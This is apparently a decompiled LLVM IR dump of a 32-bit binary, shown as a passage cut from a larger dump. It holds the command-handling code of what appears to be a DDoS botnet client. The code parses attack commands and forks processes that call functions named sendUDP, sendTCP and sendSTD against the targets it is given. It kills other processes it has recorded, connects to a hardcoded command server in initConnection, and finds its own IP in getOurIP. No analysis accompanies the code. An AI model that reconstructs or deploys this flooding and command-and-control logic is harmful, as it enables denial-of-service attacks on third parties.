dec_label_pc_daf0:                                ; preds = %dec_label_pc_da40
  %v0_daf0 = call i32 @listFork()
  %v2_daf8 = icmp eq i32 %v0_daf0, 0
  br i1 %v2_daf8, label %dec_label_pc_db00, label %dec_label_pc_e0b0

dec_label_pc_db00:                                ; preds = %dec_label_pc_daf0
  %v8_db30 = call i32 @sendUDP(i32 %v2_d91c, i32 %v1_d934, i32 %v1_d950, i32 %v1_d96c, i32 %v1_d988, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_db38 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_db3c:                                ; preds = %dec_label_pc_d7bc
  %v2_db40 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1981c.513 to i32), i32* @r1, align 4
  %v3_db4c = inttoptr i32 %v2_db40 to i8*
  %v4_db4c = call i32 @__GI_strcoll(i8* %v3_db4c, i32 ptrtoint ([4 x i8]* @global_var_1981c.513 to i32))
  %v2_db54 = icmp eq i32 %v4_db4c, 0
  br i1 %v2_db54, label %dec_label_pc_db5c, label %dec_label_pc_de20

dec_label_pc_db5c:                                ; preds = %dec_label_pc_db3c
  %v7_db64 = icmp slt i32 %arg1, 6
  br i1 %v7_db64, label %dec_label_pc_dc40, label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %dec_label_pc_db5c
  %v1_db6c = add i32 %tmp, 12
  %v1_db70 = inttoptr i32 %v1_db6c to i32*
  %v2_db70 = load i32, i32* %v1_db70, align 4
  store i32 %v2_db70, i32* @r0, align 4
  %v1_db78 = call i32 @atol(i32 %v2_db70)
  %v7_db80 = icmp eq i32 %v1_db78, -1
  br i1 %v7_db80, label %dec_label_pc_dc40, label %dec_label_pc_db88

dec_label_pc_db88:                                ; preds = %dec_label_pc_db68
  %v1_db8c = add i32 %tmp, 8
  %v1_db90 = inttoptr i32 %v1_db8c to i32*
  %v2_db90 = load i32, i32* %v1_db90, align 4
  store i32 %v2_db90, i32* @r0, align 4
  %v1_db98 = call i32 @atol(i32 %v2_db90)
  %v7_dba0 = icmp eq i32 %v1_db98, -1
  br i1 %v7_dba0, label %dec_label_pc_dc40, label %dec_label_pc_dba8

dec_label_pc_dba8:                                ; preds = %dec_label_pc_db88
  %v1_dbac = add i32 %tmp, 16
  %v1_dbb0 = inttoptr i32 %v1_dbac to i32*
  %v2_dbb0 = load i32, i32* %v1_dbb0, align 4
  store i32 %v2_dbb0, i32* @r0, align 4
  %v1_dbb8 = call i32 @atol(i32 %v2_dbb0)
  %v7_dbc0 = icmp eq i32 %v1_dbb8, -1
  br i1 %v7_dbc0, label %dec_label_pc_dc40, label %dec_label_pc_dbc8

dec_label_pc_dbc8:                                ; preds = %dec_label_pc_dba8
  %v2_dbd0 = load i32, i32* %v1_dbb0, align 4
  store i32 %v2_dbd0, i32* @r0, align 4
  %v1_dbd8 = call i32 @atol(i32 %v2_dbd0)
  %v8_dbe4 = icmp sgt i32 %v1_dbd8, 32
  br i1 %v8_dbe4, label %dec_label_pc_dc40, label %dec_label_pc_dbe8

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_dbc8
  %v7_dbf0 = icmp slt i32 %arg1, 7
  br i1 %v7_dbf0, label %dec_label_pc_dc14, label %dec_label_pc_dbf4

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_dbe8
  %v1_dbf8 = add i32 %tmp, 24
  %v1_dbfc = inttoptr i32 %v1_dbf8 to i32*
  %v2_dbfc = load i32, i32* %v1_dbfc, align 4
  store i32 %v2_dbfc, i32* @r0, align 4
  %v1_dc04 = call i32 @atol(i32 %v2_dbfc)
  %v1_dc0c = icmp slt i32 %v1_dc04, 0
  br i1 %v1_dc0c, label %dec_label_pc_dc40, label %dec_label_pc_dc14

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dbf4, %dec_label_pc_dbe8
  %v7_dc18 = icmp eq i32 %arg1, 8
  br i1 %v7_dc18, label %dec_label_pc_dc20, label %dec_label_pc_dc58

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dc14
  %v1_dc24 = add i32 %tmp, 28
  %v1_dc28 = inttoptr i32 %v1_dc24 to i32*
  %v2_dc28 = load i32, i32* %v1_dc28, align 4
  store i32 %v2_dc28, i32* @r0, align 4
  %v1_dc30 = call i32 @atol(i32 %v2_dc28)
  %v5_dc3c = icmp sgt i32 %v1_dc30, 0
  br i1 %v5_dc3c, label %dec_label_pc_dc58, label %dec_label_pc_dc40

dec_label_pc_dc40:                                ; preds = %dec_label_pc_dc20, %dec_label_pc_dbf4, %dec_label_pc_dbc8, %dec_label_pc_dba8, %dec_label_pc_db88, %dec_label_pc_db68, %dec_label_pc_db5c
  %v2_dc44 = load i32, i32* @global_var_24170.48, align 4
  %v3_dc50 = call i32 @Rootsprintf(i32 %v2_dc44, i32 ptrtoint ([186 x i8]* @global_var_19820.515 to i32))
  br label %dec_label_pc_e0b0

dec_label_pc_dc58:                                ; preds = %dec_label_pc_dc14, %dec_label_pc_dc20
  %v1_dc5c = add i32 %tmp, 4
  %v1_dc60 = inttoptr i32 %v1_dc5c to i32*
  %v2_dc60 = load i32, i32* %v1_dc60, align 4
  %v2_dc70 = load i32, i32* %v1_db90, align 4
  store i32 %v2_dc70, i32* @r0, align 4
  %v1_dc78 = call i32 @atol(i32 %v2_dc70)
  %v2_dc8c = load i32, i32* %v1_db70, align 4
  store i32 %v2_dc8c, i32* @r0, align 4
  %v1_dc94 = call i32 @atol(i32 %v2_dc8c)
  %v2_dca8 = load i32, i32* %v1_dbb0, align 4
  store i32 %v2_dca8, i32* @r0, align 4
  %v1_dcb0 = call i32 @atol(i32 %v2_dca8)
  %v1_dcc0 = add i32 %tmp, 20
  %v1_dcc4 = inttoptr i32 %v1_dcc0 to i32*
  %v2_dcc4 = load i32, i32* %v1_dcc4, align 4
  br i1 %v7_dc18, label %dec_label_pc_dcd8, label %dec_label_pc_dcf4

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_dc58
  %v1_dcdc = add i32 %tmp, 28
  %v1_dce0 = inttoptr i32 %v1_dcdc to i32*
  %v2_dce0 = load i32, i32* %v1_dce0, align 4
  store i32 %v2_dce0, i32* @r0, align 4
  %v1_dce8 = call i32 @atol(i32 %v2_dce0)
  br label %dec_label_pc_dcfc

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_dc58
  br label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dcd8, %dec_label_pc_dcf4
  %storemerge5 = phi i32 [ 10, %dec_label_pc_dcf4 ], [ %v1_dce8, %dec_label_pc_dcd8 ]
  br i1 %v7_dbf0, label %dec_label_pc_dd2c, label %dec_label_pc_dd10

dec_label_pc_dd10:                                ; preds = %dec_label_pc_dcfc
  %v1_dd14 = add i32 %tmp, 24
  %v1_dd18 = inttoptr i32 %v1_dd14 to i32*
  %v2_dd18 = load i32, i32* %v1_dd18, align 4
  store i32 %v2_dd18, i32* @r0, align 4
  %v1_dd20 = call i32 @atol(i32 %v2_dd18)
  br label %dec_label_pc_dd34

dec_label_pc_dd2c:                                ; preds = %dec_label_pc_dcfc
  br label %dec_label_pc_dd34

dec_label_pc_dd34:                                ; preds = %dec_label_pc_dd10, %dec_label_pc_dd2c
  %storemerge4 = phi i32 [ 0, %dec_label_pc_dd2c ], [ %v1_dd20, %dec_label_pc_dd10 ]
  %v2_dd48 = call i32 @__GI_strchr(i32 %v2_dc60, i32 44)
  %v2_dd50 = icmp eq i32 %v2_dd48, 0
  br i1 %v2_dd50, label %dec_label_pc_dddc, label %dec_label_pc_dd58

dec_label_pc_dd58:                                ; preds = %dec_label_pc_dd34
  store i32 %v2_dc60, i32* @r0, align 4
  %v2_dd64 = call i32 @__GI_strtok(i32 %v2_dc60, i32 ptrtoint (i32* @global_var_19720.476 to i32))
  %v2_ddd027 = icmp eq i32 %v2_dd64, 0
  br i1 %v2_ddd027, label %dec_label_pc_de20, label %dec_label_pc_dd74

dec_label_pc_dd74:                                ; preds = %dec_label_pc_dd58, %dec_label_pc_ddb8
  %storemerge1328 = phi i32 [ %v2_ddc0, %dec_label_pc_ddb8 ], [ %v2_dd64, %dec_label_pc_dd58 ]
  %v0_dd74 = call i32 @listFork()
  %v2_dd7c = icmp eq i32 %v0_dd74, 0
  br i1 %v2_dd7c, label %dec_label_pc_dd84, label %dec_label_pc_ddb8

dec_label_pc_dd84:                                ; preds = %dec_label_pc_dd74
  %v7_ddac = call i32 @sendTCP(i32 %storemerge1328, i32 %v1_dc78, i32 %v1_dc94, i32 %v1_dcb0, i32 %v2_dcc4, i32 %storemerge4, i32 %storemerge5)
  %v1_ddb4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_ddb8:                                ; preds = %dec_label_pc_dd74
  store i32 0, i32* @r0, align 4
  %v2_ddc0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19720.476 to i32))
  %v2_ddd0 = icmp eq i32 %v2_ddc0, 0
  br i1 %v2_ddd0, label %dec_label_pc_de20, label %dec_label_pc_dd74

dec_label_pc_dddc:                                ; preds = %dec_label_pc_dd34
  %v0_dddc = call i32 @listFork()
  %v2_dde4 = icmp eq i32 %v0_dddc, 0
  br i1 %v2_dde4, label %dec_label_pc_ddec, label %dec_label_pc_de20

dec_label_pc_ddec:                                ; preds = %dec_label_pc_dddc
  %v7_de14 = call i32 @sendTCP(i32 %v2_dc60, i32 %v1_dc78, i32 %v1_dc94, i32 %v1_dcb0, i32 %v2_dcc4, i32 %storemerge4, i32 %storemerge5)
  %v1_de1c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_de20:                                ; preds = %dec_label_pc_ddb8, %dec_label_pc_dd58, %dec_label_pc_dddc, %dec_label_pc_db3c
  %v2_de24 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_198dc.517 to i32), i32* @r1, align 4
  %v3_de30 = inttoptr i32 %v2_de24 to i8*
  %v4_de30 = call i32 @__GI_strcoll(i8* %v3_de30, i32 ptrtoint ([4 x i8]* @global_var_198dc.517 to i32))
  %v2_de38 = icmp eq i32 %v4_de30, 0
  br i1 %v2_de38, label %dec_label_pc_de40, label %dec_label_pc_df98

dec_label_pc_de40:                                ; preds = %dec_label_pc_de20
  %v7_de48 = icmp slt i32 %arg1, 4
  br i1 %v7_de48, label %dec_label_pc_de8c, label %dec_label_pc_de4c

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de40
  %v1_de50 = add i32 %tmp, 8
  %v1_de54 = inttoptr i32 %v1_de50 to i32*
  %v2_de54 = load i32, i32* %v1_de54, align 4
  store i32 %v2_de54, i32* @r0, align 4
  %v1_de5c = call i32 @atol(i32 %v2_de54)
  %tmp90 = icmp slt i32 %v1_de5c, 1
  br i1 %tmp90, label %dec_label_pc_de8c, label %dec_label_pc_de6c

dec_label_pc_de6c:                                ; preds = %dec_label_pc_de4c
  %v1_de70 = add i32 %tmp, 12
  %v1_de74 = inttoptr i32 %v1_de70 to i32*
  %v2_de74 = load i32, i32* %v1_de74, align 4
  store i32 %v2_de74, i32* @r0, align 4
  %v1_de7c = call i32 @atol(i32 %v2_de74)
  %v5_de88 = icmp sgt i32 %v1_de7c, 0
  br i1 %v5_de88, label %dec_label_pc_dea4, label %dec_label_pc_de8c

dec_label_pc_de8c:                                ; preds = %dec_label_pc_de6c, %dec_label_pc_de4c, %dec_label_pc_de40
  %v2_de90 = load i32, i32* @global_var_24170.48, align 4
  %v3_de9c = call i32 @Rootsprintf(i32 %v2_de90, i32 ptrtoint ([27 x i8]* @global_var_198e0.519 to i32))
  br label %dec_label_pc_e0b0

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de6c
  %v1_dea8 = add i32 %tmp, 4
  %v1_deac = inttoptr i32 %v1_dea8 to i32*
  %v2_deac = load i32, i32* %v1_deac, align 4
  %v2_debc = load i32, i32* %v1_de54, align 4
  store i32 %v2_debc, i32* @r0, align 4
  %v1_dec4 = call i32 @atol(i32 %v2_debc)
  %v2_ded8 = load i32, i32* %v1_de74, align 4
  store i32 %v2_ded8, i32* @r0, align 4
  %v1_dee0 = call i32 @atol(i32 %v2_ded8)
  %v2_def8 = call i32 @__GI_strchr(i32 %v2_deac, i32 44)
  %v2_df00 = icmp eq i32 %v2_def8, 0
  br i1 %v2_df00, label %dec_label_pc_df70, label %dec_label_pc_df08

dec_label_pc_df08:                                ; preds = %dec_label_pc_dea4
  store i32 %v2_deac, i32* @r0, align 4
  %v2_df14 = call i32 @__GI_strtok(i32 %v2_deac, i32 ptrtoint (i32* @global_var_19720.476 to i32))
  %v2_df6424 = icmp eq i32 %v2_df14, 0
  br i1 %v2_df6424, label %dec_label_pc_df98, label %dec_label_pc_df24

dec_label_pc_df24:                                ; preds = %dec_label_pc_df08, %dec_label_pc_df4c
  %storemerge1125 = phi i32 [ %v2_df54, %dec_label_pc_df4c ], [ %v2_df14, %dec_label_pc_df08 ]
  %v0_df24 = call i32 @listFork()
  %v2_df2c = icmp eq i32 %v0_df24, 0
  br i1 %v2_df2c, label %dec_label_pc_df34, label %dec_label_pc_df4c

dec_label_pc_df34:                                ; preds = %dec_label_pc_df24
  %v4_df40 = call i32 @sendSTD(i32 %storemerge1125, i32 %v1_dec4, i32 %v1_dee0, i32 0)
  %v1_df48 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_df4c:                                ; preds = %dec_label_pc_df24
  store i32 0, i32* @r0, align 4
  %v2_df54 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19720.476 to i32))
  %v2_df64 = icmp eq i32 %v2_df54, 0
  br i1 %v2_df64, label %dec_label_pc_df98, label %dec_label_pc_df24

dec_label_pc_df70:                                ; preds = %dec_label_pc_dea4
  %v0_df70 = call i32 @listFork()
  %v2_df78 = icmp eq i32 %v0_df70, 0
  br i1 %v2_df78, label %dec_label_pc_df80, label %dec_label_pc_e0b0

dec_label_pc_df80:                                ; preds = %dec_label_pc_df70
  %v4_df8c = call i32 @sendSTD(i32 %v2_deac, i32 %v1_dec4, i32 %v1_dee0, i32 0)
  %v1_df94 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_df98:                                ; preds = %dec_label_pc_df4c, %dec_label_pc_df08, %dec_label_pc_de20
  %v2_df9c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_198fc.521 to i32), i32* @r1, align 4
  %v3_dfa8 = inttoptr i32 %v2_df9c to i8*
  %v4_dfa8 = call i32 @__GI_strcoll(i8* %v3_dfa8, i32 ptrtoint ([5 x i8]* @global_var_198fc.521 to i32))
  %v2_dfb0 = icmp eq i32 %v4_dfa8, 0
  br i1 %v2_dfb0, label %dec_label_pc_dfb8, label %dec_label_pc_e0b0

dec_label_pc_dfb8:                                ; preds = %dec_label_pc_df98
  br label %dec_label_pc_e05c

dec_label_pc_dfcc:                                ; preds = %dec_label_pc_e05c, %dec_label_pc_e090
  %v3_dfd0 = mul i32 %storemerge9, 4
  %v2_dfdc = load i32, i32* @global_var_2a3fc.69, align 4
  %v2_dfe0 = add i32 %v2_dfdc, %v3_dfd0
  %v1_dfe4 = inttoptr i32 %v2_dfe0 to i32*
  %v2_dfe4 = load i32, i32* %v1_dfe4, align 4
  %v2_dfe8 = icmp eq i32 %v2_dfe4, 0
  br i1 %v2_dfe8, label %dec_label_pc_e050, label %dec_label_pc_dff0

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dfcc
  %v2_e008 = load i32, i32* %v1_dfe4, align 4
  store i32 %v2_e008, i32* @r4, align 4
  %v0_e00c = call i32 @__libc_getpid()
  %v0_e014 = load i32, i32* @r4, align 4
  %v9_e014 = icmp eq i32 %v0_e014, %v0_e00c
  br i1 %v9_e014, label %dec_label_pc_e050, label %dec_label_pc_e01c

dec_label_pc_e01c:                                ; preds = %dec_label_pc_dff0
  %v0_e040 = call i32 @kill()
  %v1_e048 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_e050

dec_label_pc_e050:                                ; preds = %dec_label_pc_dff0, %dec_label_pc_dfcc, %dec_label_pc_e01c
  %v24_e0b434 = phi i32 [ %v24_e0b435, %dec_label_pc_dfcc ], [ %v0_e00c, %dec_label_pc_dff0 ], [ %v0_e040, %dec_label_pc_e01c ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_dfcc ], [ %stack_var_-44.1, %dec_label_pc_dff0 ], [ %v1_e048, %dec_label_pc_e01c ]
  %v1_e054 = add i32 %storemerge9, 1
  br label %dec_label_pc_e05c

dec_label_pc_e05c:                                ; preds = %dec_label_pc_dfb8, %dec_label_pc_e050
  %v24_e0b435 = phi i32 [ 0, %dec_label_pc_dfb8 ], [ %v24_e0b434, %dec_label_pc_e050 ]
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_dfb8 ], [ %stack_var_-44.0, %dec_label_pc_e050 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_dfb8 ], [ %v1_e054, %dec_label_pc_e050 ]
  %v5_e074 = load i32, i32* @global_var_2417c.67, align 4
  %v9_e088 = icmp eq i32 %v5_e074, 0
  br i1 %v9_e088, label %dec_label_pc_e090, label %dec_label_pc_dfcc

dec_label_pc_e090:                                ; preds = %dec_label_pc_e05c
  %v2_e074 = load i32, i32* @global_var_24178.66, align 4
  %tmp98 = icmp ugt i32 %v2_e074, %storemerge9
  br i1 %tmp98, label %dec_label_pc_dfcc, label %dec_label_pc_e0b0

dec_label_pc_e0b0:                                ; preds = %dec_label_pc_e090, %dec_label_pc_dacc, %dec_label_pc_da64, %dec_label_pc_d674, %dec_label_pc_df70, %dec_label_pc_df98, %dec_label_pc_daf0, %dec_label_pc_d698, %dec_label_pc_d5c0, %dec_label_pc_d654, %dec_label_pc_d648, %dec_label_pc_d558, %dec_label_pc_de8c, %dec_label_pc_dc40, %dec_label_pc_d8fc, %dec_label_pc_d5f8, %dec_label_pc_d4fc
  %v24_e0b4 = phi i32 [ %v1_d684, %dec_label_pc_d674 ], [ %v0_df70, %dec_label_pc_df70 ], [ %v4_dfa8, %dec_label_pc_df98 ], [ %v0_daf0, %dec_label_pc_daf0 ], [ %v0_d698, %dec_label_pc_d698 ], [ 0, %dec_label_pc_d5c0 ], [ %v1_d664, %dec_label_pc_d654 ], [ 0, %dec_label_pc_d648 ], [ 0, %dec_label_pc_d558 ], [ %v3_de9c, %dec_label_pc_de8c ], [ %v3_dc50, %dec_label_pc_dc40 ], [ %v3_d90c, %dec_label_pc_d8fc ], [ %v0_d5d0, %dec_label_pc_d5f8 ], [ %v3_d50c, %dec_label_pc_d4fc ], [ 0, %dec_label_pc_da64 ], [ 0, %dec_label_pc_dacc ], [ %v24_e0b435, %dec_label_pc_e090 ]
  store i32 %v3_d4c8, i32* @r4, align 4
  store i32 %v6_d4c8, i32* @r5, align 4
  store i32 %v9_d4c8, i32* @r6, align 4
  store i32 %v12_d4c8, i32* @r7, align 4
  store i32 %v15_d4c8, i32* @r8, align 4
  store i32 %v18_d4c8, i32* @fp, align 4
  ret i32 %v24_e0b4

; uselistorder directives
  uselistorder i32 %stack_var_-44.1, { 0, 2, 1 }
  uselistorder i32 %v2_df54, { 1, 0 }
  uselistorder i32 %v1_dee0, { 1, 0 }
  uselistorder i32 %v1_dec4, { 1, 0 }
  uselistorder i32 %v2_deac, { 2, 1, 0, 3 }
  uselistorder i32 %v2_ddc0, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v1_dcb0, { 1, 0 }
  uselistorder i32 %v1_dc94, { 1, 0 }
  uselistorder i32 %v1_dc78, { 1, 0 }
  uselistorder i32 %v2_dc60, { 2, 1, 0, 3 }
  uselistorder i32 %v2_dad4, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %v1_d96c, { 1, 0 }
  uselistorder i32 %v1_d950, { 1, 0 }
  uselistorder i32 %v1_d934, { 1, 0 }
  uselistorder i32 %v2_d91c, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 4, 1, 5, 6, 7, 8, 0, 9, 10, 11, 14, 13, 12, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19720.476 to i32), { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 1000, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2a3f8.498, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_193d8.50 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_e0b0, { 0, 5, 4, 12, 13, 6, 1, 2, 14, 7, 3, 9, 10, 15, 8, 11, 16 }
  uselistorder label %dec_label_pc_e05c, { 1, 0 }
  uselistorder label %dec_label_pc_e050, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dfcc, { 1, 0 }
  uselistorder label %dec_label_pc_df24, { 1, 0 }
  uselistorder label %dec_label_pc_de20, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_dd74, { 1, 0 }
  uselistorder label %dec_label_pc_dd34, { 1, 0 }
  uselistorder label %dec_label_pc_dcfc, { 1, 0 }
  uselistorder label %dec_label_pc_dc58, { 1, 0 }
  uselistorder label %dec_label_pc_da80, { 1, 0 }
  uselistorder label %dec_label_pc_da40, { 1, 0 }
  uselistorder label %dec_label_pc_da08, { 1, 0 }
  uselistorder label %dec_label_pc_d9c4, { 1, 0 }
  uselistorder label %dec_label_pc_d914, { 1, 0 }
  uselistorder label %dec_label_pc_d7bc, { 1, 0 }
  uselistorder label %dec_label_pc_d59c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_e10c = load i32, i32* @fp, align 4
  store i32 57620, i32* %stack_var_-4, align 4
  %v2_e110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e110, i32* @fp, align 4
  %v2_e124 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_e134 = bitcast i32* %stack_var_-4116 to i8*
  %v3_e134 = call i32 @__GI_memset(i8* %v2_e134, i32 0)
  %v2_e13c = load i32, i32* @global_var_24170.48, align 4
  %v2_e140 = icmp eq i32 %v2_e13c, 0
  br i1 %v2_e140, label %dec_label_pc_e164, label %dec_label_pc_e148

dec_label_pc_e148:                                ; preds = %entry
  %v1_e154 = call i32 @__libc_close(i32 %v2_e13c)
  store i32 0, i32* @global_var_24170.48, align 4
  br label %dec_label_pc_e164

dec_label_pc_e164:                                ; preds = %entry, %dec_label_pc_e148
  %v2_e168 = load i32, i32* @global_var_23d48.526, align 4
  %v2_e16c = icmp eq i32 %v2_e168, 0
  br i1 %v2_e16c, label %dec_label_pc_e198, label %dec_label_pc_e184

dec_label_pc_e184:                                ; preds = %dec_label_pc_e164
  %v1_e18c = add i32 %v2_e168, 1
  br label %dec_label_pc_e198

dec_label_pc_e198:                                ; preds = %dec_label_pc_e164, %dec_label_pc_e184
  %storemerge1 = phi i32 [ %v1_e18c, %dec_label_pc_e184 ], [ 0, %dec_label_pc_e164 ]
  store i32 %storemerge1, i32* @global_var_23d48.526, align 4
  %v4_e1b0 = mul i32 %storemerge1, 4
  %v5_e1b0 = add i32 %v4_e1b0, ptrtoint ([20 x i8]** @global_var_2313c.528 to i32)
  %v6_e1b0 = inttoptr i32 %v5_e1b0 to i32*
  %v7_e1b0 = load i32, i32* %v6_e1b0, align 4
  %v2_e1bc = inttoptr i32 %v7_e1b0 to i8*
  %v3_e1bc = call i32 @strcpy(i32 %v2_e124, i8* %v2_e1bc)
  %v2_e1dc = call i32 @__GI_strchr(i32 %v2_e124, i32 58)
  %v2_e1e4 = icmp eq i32 %v2_e1dc, 0
  br i1 %v2_e1e4, label %dec_label_pc_e244, label %dec_label_pc_e1ec

dec_label_pc_e1ec:                                ; preds = %dec_label_pc_e198
  %v2_e200 = call i32 @__GI_strchr(i32 %v2_e124, i32 58)
  %v1_e208 = add i32 %v2_e200, 1
  store i32 %v1_e208, i32* @r0, align 4
  %v1_e210 = call i32 @atol(i32 %v1_e208)
  %v2_e230 = call i32 @__GI_strchr(i32 %v2_e124, i32 58)
  %v3_e240 = inttoptr i32 %v2_e230 to i8*
  store i8 0, i8* %v3_e240, align 1
  br label %dec_label_pc_e244

dec_label_pc_e244:                                ; preds = %dec_label_pc_e198, %dec_label_pc_e1ec
  %stack_var_-20.0 = phi i32 [ 123, %dec_label_pc_e198 ], [ %v1_e210, %dec_label_pc_e1ec ]
  %v0_e250 = call i32 @socket()
  store i32 %v0_e250, i32* @global_var_24170.48, align 4
  %v4_e284 = call i32 @connectTimeout(i32 %v0_e250, i32 %v2_e124, i32 %stack_var_-20.0, i32 30)
  %v2_e28c = icmp eq i32 %v4_e284, 0
  %. = zext i1 %v2_e28c to i32
  store i32 %v3_e10c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_e124, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e244, { 1, 0 }
  uselistorder label %dec_label_pc_e198, { 1, 0 }
  uselistorder label %dec_label_pc_e164, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e2d4 = load i32, i32* @fp, align 4
  store i32 %v3_e2d4, i32* %stack_var_-16, align 4
  %v0_e2f0 = call i32 @socket()
  %v3_e300 = icmp eq i32 %v0_e2f0, -1
  br i1 %v3_e300, label %dec_label_pc_e308, label %dec_label_pc_e318

dec_label_pc_e308:                                ; preds = %entry
  br label %dec_label_pc_e580

dec_label_pc_e318:                                ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19904.530 to i32), i32* @r0, align 4
  %v2_e35c = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_19904.530 to i32))
  %v1_e36c = call i32 @htons(i32 53)
  %v3_e390 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_e390 = call i32 @__libc_connect(i32 %v0_e2f0, %sockaddr* %v3_e390, i32 16)
  %v3_e3a0 = icmp eq i32 %v4_e390, -1
  br i1 %v3_e3a0, label %dec_label_pc_e3a8, label %dec_label_pc_e3b8

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e318
  br label %dec_label_pc_e580

dec_label_pc_e3b8:                                ; preds = %dec_label_pc_e318
  store i32 16, i32* %stack_var_-72, align 4
  %v2_e3c0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_e3c4 = ptrtoint i32* %stack_var_-72 to i32
  %v5_e3d0 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_e3d0 = call i32 @__GI_getsockname(i32 %v0_e2f0, %sockaddr* %v5_e3d0, i32 %v2_e3c4, i32 %v2_e3c0, i32 16)
  %v3_e3e0 = icmp eq i32 %v6_e3d0, -1
  br i1 %v3_e3e0, label %dec_label_pc_e3e8, label %dec_label_pc_e3f8

dec_label_pc_e3e8:                                ; preds = %dec_label_pc_e3b8
  br label %dec_label_pc_e580

dec_label_pc_e3f8:                                ; preds = %dec_label_pc_e3b8
  store i32 ptrtoint (i32* @global_var_2a3f0.80 to i32), i32* @r2, align 4
  %v4_e40c = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1990c.533, i32 0, i32 0), i32 0)
  %v2_e4a4 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_e49c

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e49c
  %v8_e430 = call i32 @strstr(i32 %v2_e4a4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1991c.535, i32 0, i32 0), i32 %v4_e40c, i32 %v2_e4a4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_e438 = icmp eq i32 %v8_e430, 0
  br i1 %v2_e438, label %dec_label_pc_e480, label %dec_label_pc_e460.preheader

dec_label_pc_e460.preheader:                      ; preds = %dec_label_pc_e41c
  %v2_e4649 = load i8, i8* %stack_var_-4168, align 1
  %v7_e46813 = icmp eq i8 %v2_e4649, 9
  br i1 %v7_e46813, label %dec_label_pc_e470, label %dec_label_pc_e454

dec_label_pc_e454:                                ; preds = %dec_label_pc_e460.preheader, %dec_label_pc_e454
  %v4_e46014 = phi i32 [ %v1_e458, %dec_label_pc_e454 ], [ %v2_e4a4, %dec_label_pc_e460.preheader ]
  %v1_e458 = add i32 %v4_e46014, 1
  %v5_e45c = inttoptr i32 %v1_e458 to i8*
